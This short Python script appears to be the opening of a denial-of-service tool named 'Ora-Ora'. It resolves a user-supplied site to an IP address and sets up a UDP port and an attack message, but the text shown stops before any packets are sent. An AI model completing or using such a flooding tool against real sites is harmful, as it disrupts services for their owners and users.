import time
import socket
import sys
from colorama import Fore, Back, Style
import pyfiglet

result = pyfiglet.figlet_format('Ora-Ora')
print( Fore.MAGENTA + result)
print(Fore.RED + "Developed with <3 by Elkyw")
print(Fore.YELLOW + "version 1.4.8.8")
site = input(Fore.CYAN + "Enter your site url => ")

ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'Ora-Ora attack'
print(Fore.GREEN +" target IP:", ip)
print(" target port:", UDP_PORT)
time.sleep(3) 
